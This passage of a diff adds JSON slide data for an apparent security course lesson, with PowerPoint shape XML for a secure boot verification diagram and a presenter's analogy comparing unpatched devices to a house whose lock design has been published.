+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"13\" name=\"TextBox 12\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"3405350\" y=\"2090000\"/><a:ext cx=\"2523150\" cy=\"260000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1200\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>02</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"14\" name=\"TextBox 13\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"3405350\" y=\"2400000\"/><a:ext cx=\"2523150\" cy=\"560000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1350\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"1A1A1A\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>VERIFICATION PHASE 1</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"15\" name=\"TextBox 14\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"3415350\" y=\"2980000\"/><a:ext cx=\"2503150\" cy=\"1000000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1050\" b=\"0\" i=\"0\"><a:solidFill><a:srgbClr val=\"3F3F3F\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>ROM bootloader reads secondary bootloader hash, decrypts hardware signature with public key anchor.</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:cxnSp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvCxnSpPr><p:cNvPr id=\"16\" name=\"Connector 15\"/><p:cNvCxnSpPr/><p:nvPr/></p:nvCxnSpPr><p:spPr><a:xfrm><a:off x=\"6030500\" y=\"3005000\"/><a:ext cx=\"41000\" cy=\"0\"/></a:xfrm><a:prstGeom prst=\"line\"><a:avLst/></a:prstGeom><a:ln w=\"22225\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"0\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"tx1\"/></a:fontRef></p:style></p:cxnSp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"17\" name=\"Isosceles Triangle 16\"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm rot=\"5400000\"><a:off x=\"6096500\" y=\"2940000\"/><a:ext cx=\"130000\" cy=\"130000\"/></a:xfrm><a:prstGeom prst=\"triangle\"><a:avLst/></a:prstGeom><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill><a:ln><a:noFill/></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"3\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"lt1\"/></a:fontRef></p:style><p:txBody><a:bodyPr rtlCol=\"0\" anchor=\"ctr\"/><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"18\" name=\"Rounded Rectangle 17\"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"6173500\" y=\"1980000\"/><a:ext cx=\"2703150\" cy=\"2050000\"/></a:xfrm><a:prstGeom prst=\"roundRect\"><a:avLst><a:gd name=\"adj\" fmla=\"val 9000\"/></a:avLst></a:prstGeom><a:solidFill><a:srgbClr val=\"FBEEF0\"/></a:solidFill><a:ln w=\"19050\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"3\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"lt1\"/></a:fontRef></p:style><p:txBody><a:bodyPr rtlCol=\"0\" anchor=\"ctr\"/><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"19\" name=\"TextBox 18\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"6263500\" y=\"2090000\"/><a:ext cx=\"2523150\" cy=\"260000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1200\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>03</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"20\" name=\"TextBox 19\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"6263500\" y=\"2400000\"/><a:ext cx=\"2523150\" cy=\"560000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1350\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"1A1A1A\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>VERIFICATION PHASE 2</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"21\" name=\"TextBox 20\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"6273500\" y=\"2980000\"/><a:ext cx=\"2503150\" cy=\"1000000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1050\" b=\"0\" i=\"0\"><a:solidFill><a:srgbClr val=\"3F3F3F\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>If match is verified, secondary bootloader executes, validating OS kernel signature in Flash memory.</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:cxnSp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvCxnSpPr><p:cNvPr id=\"22\" name=\"Connector 21\"/><p:cNvCxnSpPr/><p:nvPr/></p:nvCxnSpPr><p:spPr><a:xfrm><a:off x=\"8888650\" y=\"3005000\"/><a:ext cx=\"41000\" cy=\"0\"/></a:xfrm><a:prstGeom prst=\"line\"><a:avLst/></a:prstGeom><a:ln w=\"22225\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"0\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"tx1\"/></a:fontRef></p:style></p:cxnSp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"23\" name=\"Isosceles Triangle 22\"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm rot=\"5400000\"><a:off x=\"8954650\" y=\"2940000\"/><a:ext cx=\"130000\" cy=\"130000\"/></a:xfrm><a:prstGeom prst=\"triangle\"><a:avLst/></a:prstGeom><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill><a:ln><a:noFill/></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"3\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"lt1\"/></a:fontRef></p:style><p:txBody><a:bodyPr rtlCol=\"0\" anchor=\"ctr\"/><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"24\" name=\"Rounded Rectangle 23\"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"9031650\" y=\"1980000\"/><a:ext cx=\"2703150\" cy=\"2050000\"/></a:xfrm><a:prstGeom prst=\"roundRect\"><a:avLst><a:gd name=\"adj\" fmla=\"val 9000\"/></a:avLst></a:prstGeom><a:solidFill><a:srgbClr val=\"FBEEF0\"/></a:solidFill><a:ln w=\"19050\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill></a:ln><a:effectLst/></p:spPr><p:style><a:lnRef idx=\"1\"><a:schemeClr val=\"accent1\"/></a:lnRef><a:fillRef idx=\"3\"><a:schemeClr val=\"accent1\"/></a:fillRef><a:effectRef idx=\"2\"><a:schemeClr val=\"accent1\"/></a:effectRef><a:fontRef idx=\"minor\"><a:schemeClr val=\"lt1\"/></a:fontRef></p:style><p:txBody><a:bodyPr rtlCol=\"0\" anchor=\"ctr\"/><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"25\" name=\"TextBox 24\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"9121650\" y=\"2090000\"/><a:ext cx=\"2523150\" cy=\"260000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1200\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"9C1C2C\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>04</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"26\" name=\"TextBox 25\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"9121650\" y=\"2400000\"/><a:ext cx=\"2523150\" cy=\"560000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1350\" b=\"1\" i=\"0\"><a:solidFill><a:srgbClr val=\"1A1A1A\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>SECURE BOOT OS LOAD</a:t></a:r></a:p></p:txBody></p:sp>",
+     "<p:sp xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:nvSpPr><p:cNvPr id=\"27\" name=\"TextBox 26\"/><p:cNvSpPr txBox=\"1\"/><p:nvPr/></p:nvSpPr><p:spPr><a:xfrm><a:off x=\"9131650\" y=\"2980000\"/><a:ext cx=\"2503150\" cy=\"1000000\"/></a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom><a:noFill/></p:spPr><p:txBody><a:bodyPr wrap=\"square\" lIns=\"45720\" rIns=\"45720\" tIns=\"27432\" bIns=\"27432\" anchor=\"t\"><a:spAutoFit/></a:bodyPr><a:lstStyle/><a:p><a:pPr algn=\"ctr\"/><a:r><a:rPr sz=\"1050\" b=\"0\" i=\"0\"><a:solidFill><a:srgbClr val=\"3F3F3F\"/></a:solidFill><a:latin typeface=\"Calibri\"/></a:rPr><a:t>Control safely transfers execution to OS kernel. System boots into hardened runtime environment.</a:t></a:r></a:p></p:txBody></p:sp>"
+    ],
+    "notes": ""
+   }
+  ],
+  "big_idea": {
+   "text": "An unpatched device is a house whose lock design was published in a public catalog. The vulnerability becomes common knowledge long before most owners get around to changing what's on their door.",
+   "closing": "Hold onto this picture — we'll come back to it as the mechanics get more technical.",
+   "notes": "Big-idea framing for Topic 4.1. Open with this analogy before the mechanics: \"An unpatched device is a house whose lock design was published in a public catalog. The vulnerability becomes common knowledge long before most owners get around to changing what's on their door.\" Ask students for their own version of the analogy before moving on."
+  }
+ }
+}
